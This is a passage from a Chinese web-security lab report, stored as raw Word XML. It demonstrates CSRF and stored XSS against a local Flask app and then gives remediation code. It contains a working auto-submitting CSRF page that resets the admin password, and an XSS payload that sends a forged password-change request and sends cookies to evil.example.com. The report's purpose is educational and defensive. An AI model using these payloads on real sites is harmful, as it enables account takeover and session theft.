        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>攻击者在自己的网站上放置以下恶意页面（csrf_attack.html）：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&lt;html&gt;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&lt;body&gt;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&lt;h2&gt;恭喜你中奖了！点击领取奖品&lt;/h2&gt;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&lt;!-- 隐藏的自动提交表单 —— 受害者完全看不到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&lt;form id="csrf-form" action="http://127.0.0.1:5000/change-password" method="POST"&gt;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&lt;input type="hidden" name="username" value="admin"&gt;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&lt;input type="hidden" name="new_password" value="hacked123"&gt;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&lt;/form&gt;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// 页面加载后自动提交表单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document.getElementById('csrf-form').submit();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&lt;/script&gt;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&lt;/body&gt;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&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>攻击流程分以下几步：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>攻击者准备好这个页面，可以选择放在自己可控的网站上，也可以作为本地HTML文件发送给受害者。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>此时受害者alice已经登录了用户管理系统（例如访问 http://127.0.0.1:5000 并正常登录），但还没有退出，浏览器里存着有效的Session Cookie。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>攻击者通过邮件、聊天消息或论坛帖子等方式，将恶意页面的链接发给alice，并用各种话术诱导alice打开这个链接。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>alice出于好奇或信任点开了这个链接。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>恶意页面在alice完全没有察觉的情况下自动向 `/change-password` 发送了POST请求。由于是同一个浏览器发起的请求，浏览器会自动将管理系统的Cookie也一并发送过去。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>服务器检查发现Cookie对应的Session有效（因为alice确实是登录状态），于是通过了登录校验，然后根据表单中的参数把admin的密码改成了"hacked123"。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>攻击者现在可以用 admin / hacked123 登录系统，获得管理员权限。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关键点</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>：整个过程alice不知情，浏览器自动发送了Cookie（这也是浏览器"同源策略不限制Cookie发送方向"这一特性的直接体现——浏览器在发起跨域请求时仍然会携带目标域名的Cookie），服务器因为只检查了登录态就放行，所以攻击成功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攻击场景二：修改自己的密码（自我攻击型）</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>如果攻击者诱使已登录用户访问一个恶意页面，把表单中的username设为受害者自己的用户名，则受害者在不知情的情况下修改了自己的密码，导致无法登录。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攻击场景三：批量修改密码</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>攻击者可以尝试遍历用户名，在一个恶意页面中包含多个隐藏的iframe或表单：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&lt;iframe style="display:none" src="http://127.0.0.1:5000/profile?user_id=1"&gt;&lt;/iframe&gt;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先获取其他用户信息，再遍历修改密码 --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>6.4 CSRF攻击成功的必要条件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>受害者已经登录目标网站，Cookie仍然有效</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>目标网站的敏感操作（如修改密码）没有CSRF防护</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>攻击者能够构造一个自动发送请求的页面</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>受害者被诱导访问了该恶意页面</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>七、综合攻击：XSS + CSRF 组合利用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>7.1 组合攻击原理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>存储型XSS和CSRF可以组合利用，产生更严重的攻击效果。攻击者先通过XSS注入恶意脚本，该脚本利用用户在目标网站的登录状态发起CSRF攻击。这种组合攻击可以在不依赖外部恶意页面的情况下完成，攻击链更隐蔽。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>7.2 攻击演示</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>攻击者在留言板中提交以下留言内容：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// 该脚本在受害者浏览器中自动执行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// 1. 首先获取当前用户的身份信息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var currentUser = document.querySelector('.nav-welcome');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console.log('当前用户: ' + currentUser.textContent);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// 2. 自动提交修改密码的CSRF请求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var xhr = new XMLHttpRequest();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xhr.open('POST', '/change-password', true);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xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');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xhr.send('username=admin&amp;new_password=pwned_by_xss');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// 3. 也可以窃取Cookie并发送到外部服务器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var img = new Image();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img.src = 'http://evil.example.com/log?data=' + encodeURI(document.cookie);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&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>这段代码的执行过程是：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>任何一个已登录用户访问首页，留言板的内容被加载出来。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>`| safe` 过滤器让浏览器把 `&lt;script&gt;` 标签当作JavaScript代码来执行。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>脚本自动发送POST请求到 `/change-password`，修改admin的密码。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>由于当前用户已登录且Cookie有效，服务器接受了这个请求。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>admin的密码在真正的管理员毫不知情的情况下被改为攻击者设定的值。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>这种攻击的威力在于：只要有一个用户打开首页，攻击就会自动发生。如果管理员admin自己打开首页看到了这条留言，那么admin自己的密码就被改了——攻击者不需要知道管理员什么时候在线，只要管理员或任何已登录用户某一天打开首页，攻击就会触发。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>这就是为什么说XSS+CSRF组合是Web安全中危害极大的攻击链：XSS负责在目标域内执行任意JavaScript（绕过了同源策略对JavaScript主动发起的跨域读取请求的限制），CSRF负责利用这一能力向同源接口发送恶意请求，两者配合可以完成几乎所有攻击者想做的事情。</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>八、漏洞修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>8.1 XSS漏洞修复</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>8.1.1 输出编码（HTML Entity Encoding）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原理</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>：对输出到HTML页面的用户数据进行HTML实体编码，将特殊字符转换为对应的HTML实体。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字符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HTML实体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&lt;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&amp;amp;lt;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&gt;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&amp;amp;gt;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&amp;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&amp;amp;amp;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"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&amp;amp;quot;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'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&amp;amp;#x27;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修复方法</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>：移除模板中的 `| safe` 过滤器，让Jinja2默认进行HTML转义：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修复前（不安全）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&lt;div class="comment-content"&gt;{{ comment.content | safe }}&lt;/div&gt;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修复后（安全 — 默认转义）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&lt;div class="comment-content"&gt;{{ comment.content }}&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>8.1.2 输入过滤</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>除了输出编码，还应该在服务端对用户输入进行白名单过滤。如果业务场景允许纯文本，可以彻底移除所有HTML标签：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import re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sanitize_input(text):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"""移除所有HTML标签"""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去掉 &lt;script&gt;、&lt;img&gt;、&lt;a&gt; 等所有HTML标签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clean = re.sub(r'&lt;[^&gt;]*&gt;', '', text)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return clean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在存储前调用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content = sanitize_input(request.form.get("content", ""))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>此外，还可以使用成熟的XSS过滤库如 Bleach（Python）来完成更完善的过滤。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>8.1.3 Content-Security-Policy（CSP）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原理</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>：通过HTTP响应头告诉浏览器哪些源的内容是可信的、允许加载的。浏览器会阻止不符合策略的脚本执行。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在Flask中添加CSP响应头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@app.after_request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add_security_headers(response):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response.headers['Content-Security-Policy'] = \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"default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self'"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return response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CSP各指令含义</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24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指令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含义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示例值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default-src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默认加载策略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'self'（仅允许同源）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script-src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JavaScript加载策略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'self'（禁止内联脚本和外部脚本）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style-src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CSS样式加载策略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'self'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img-src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图片加载策略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'self'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr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connect-src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AJAX/WebSocket连接策略</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>'self'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注意：'self' 只能限制从哪个域名加载资源，但不能阻止反射型和存储型XSS中直接写入 `&lt;script&gt;` 标签的内联代码。要阻止内联脚本，还需要配合 nonce或hash机制，或者直接使用 `script-src 'nonce-&lt;随机值&gt;'`。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>8.1.4 HttpOnly Cookie</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>给Session Cookie设置HttpOnly属性，使JavaScript无法通过 `document.cookie` 读取Cookie：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app.config['SESSION_COOKIE_HTTPONLY'] = True</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>这样一来，即使存在XSS漏洞，攻击者也无法直接通过 `document.cookie` 窃取Session ID。但需要注意的是，HttpOnly只能防止Cookie被读取，不能阻止攻击者利用XSS发起CSRF请求（因为浏览器发送请求时会自动携带Cookie，不受HttpOnly影响）。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>8.2 CSRF漏洞修复</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>8.2.1 CSRF Token（推荐方案）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原理</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>：服务器为每个用户Session生成一个随机的CSRF Token，嵌入表单的隐藏字段中。处理请求时验证表单中的Token是否与Session中的Token一致。攻击者无法事先知道这个随机值，所以无法构造有效的伪造请求。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420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实现步骤</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>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1. 在 session 中存储 CSRF Token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import secrets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@app.before_request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csrf_protect():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'csrf_token' not in session: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session['csrf_token'] = secrets.token_hex(32)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2. 在表单中添加隐藏字段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&lt;input type="hidden" name="csrf_token" value="{{ session.csrf_token }}"&gt;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3. 在敏感操作（如修改密码）中验证Token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@app.route("/change-password",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change_password():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验证 CSRF Token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token = request.form.get("csrf_token",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not token or token != session.get("csrf_token"):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"CSRF验证失败，请求被拒绝", 403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... 继续处理密码修改</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Token需要满足以下要求：每个会话独立、足够长且随机（至少128位）、不可预测。攻击者无法从外部获取Token值，因此无法构造有效的请求。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>8.2.2 验证原密码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>修改密码等敏感操作必须要求用户输入原密码，即使CSRF攻击成功提交了请求，攻击者不知道原密码也无法完成修改：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先验证原密码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old_password = request.form.get("old_password",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user = USERS.get(username)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if not user or not check_password_hash(user["password"], old_password):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return "原密码错误，修改失败", 403</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>8.2.3 验证Referer/Origin请求头</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>检查HTTP请求中的Referer或Origin头，确认请求来自本站页面。这种方法不是100%可靠（Referer可以被伪造或禁用），但可以作为辅助防护。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@app.route("/change-password",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change_password():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校验 Referer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referer = request.headers.get("Referer",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"127.0.0.1:5000" not in referer and "localhost" not in referer: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"非法请求来源", 403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... 继续处理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>8.2.4 SameSite Cookie属性</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>设置Cookie的SameSite属性为Strict或Lax，限制跨站请求时Cookie的发送行为：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app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'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SameSite值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行为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Strict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完全禁止跨站发送Cookie（最严格，但可能影响用户体验）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Lax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允许顶级导航（如点击链接）时发送Cookie，禁止POST等跨站请求携带Cookie（推荐）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None</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>不限制（需配合Secure属性使用）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SameSite=Lax 是目前大多数浏览器的默认值，它的权衡比较合理：一方面阻止了跨站POST/iframe等场景下的CSRF攻击，另一方面允许用户从外部页面点击链接进来时仍然保持登录状态，不会影响正常的页面跳转体验。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>8.3 修复代码对比</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>8.3.1 存储型XSS修复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===== 修复前 =====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@app.route("/post-comment",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post_comment():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content = request.form.get("content",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直接存入数据库，不做过滤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cursor.execute("INSERT INTO comments ...", (username, content, ...))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模板中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{{ comment.content | safe }}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===== 修复后 =====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@app.route("/post-comment",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post_comment():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content = request.form.get("content",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使用BLEACH库清洗HTML标签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import bleach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allowed_tags = ['b', 'i', 'u', 'br', 'p']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content = bleach.clean(content, tags=allowed_tags, strip=True)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cursor.execute("INSERT INTO comments ...", (username, content, ...))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模板中（移除 | safe 过滤器）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{{ comment.content }}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>8.3.2 反射型XSS修复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===== 修复前 =====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echo_content = feedback_msg  # 原样回显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模板中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{{ echo_content | safe }}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===== 修复后 =====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不需要额外处理，模板默认转义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echo_content = feedback_msg  # Jinja2 自动HTML编码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模板中（移除 | safe 过滤器）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{{ echo_content }}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>8.3.3 CSRF修复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===== 修复前 =====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@app.route("/change-password",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change_password():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仅检查登录态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not session.get("username"):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redirect("/login")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target = request.form.get("username")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new_pw = request.form.get("new_password")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直接修改，无任何防护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USERS[target]["password"] = generate_password_hash(new_pw)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===== 修复后 =====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@app.route("/change-password", methods=["POST"])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def change_password():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current_user = session.get("username")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not current_user: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redirect("/login")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1. CSRF Token校验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token = request.form.get("csrf_token",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not token or token != session.get("csrf_token"):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"CSRF Token验证失败", 403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2. 原密码验证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old_pw = request.form.get("old_password",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user = USERS.get(current_user)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if not user or not check_password_hash(user["password"], old_pw):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    return "原密码错误", 403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# 3. 只允许修改自己的密码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new_pw = request.form.get("new_password", "")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USERS[current_user]["password"] = generate_password_hash(new_pw)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>8.4 防护措施汇总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防护措施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防护目标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防护原理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HTML输出编码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XSS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将 `&lt;` `&gt;` 等转为 HTML 实体，阻止浏览器解析为标签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CSRF Token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CSRF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验证表单Token与Session Token一致，攻击者无法预测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输入过滤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XSS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移除用户输入中的HTML标签和危险字符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CSP响应头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XSS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浏览器层面的脚本执行管控，限制脚本来源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HttpOnly Cookie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XSS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禁止JS读取Cookie，降低Cookie被窃取的风险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验证原密码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CSRF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敏感操作需要确认身份凭据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SameSite Cookie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CSRF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浏览器层面限制跨站请求发送Cookie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Referer校验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CSRF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验证请求来源是否为本站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18"/>
              </w:rPr>
              <w:t>低（辅助）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>九、实验总结</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
